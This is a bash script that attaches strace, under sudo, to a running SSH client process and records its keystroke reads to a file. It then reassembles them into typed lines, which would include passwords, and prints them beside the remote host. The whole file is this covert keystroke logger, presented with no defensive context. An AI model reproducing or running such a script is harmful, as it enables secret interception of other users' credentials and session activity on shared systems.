#!/bin/bash

pid=`ps aux | grep -e "ssh.*.p22" -m1 | awk '{print $2}'`
echo $pid
host=`ps aux | grep -e "ssh.*.p22" -m1 | awk '{print $11" "$12" "$13}'`
sudo strace -e trace=read -p $pid 2>&1 | while read -r a; do grep '^read.*= [1-9]$' <<<"$a";done | cut -d "\"" -f 2 > logger.txt

#cat logger.txt | tr -d '\n'
input=" "
echo "login from: " $host
for i in $(cat logger.txt):
do
	if [[ "$i" != "\n" &&  "$i" != "\r" && "$i" != "\177" ]]; then
		input+=$i
	elif [ "$i" == "\177" ]; then
		continue
	else
		echo $input
		input=" "
	fi
done
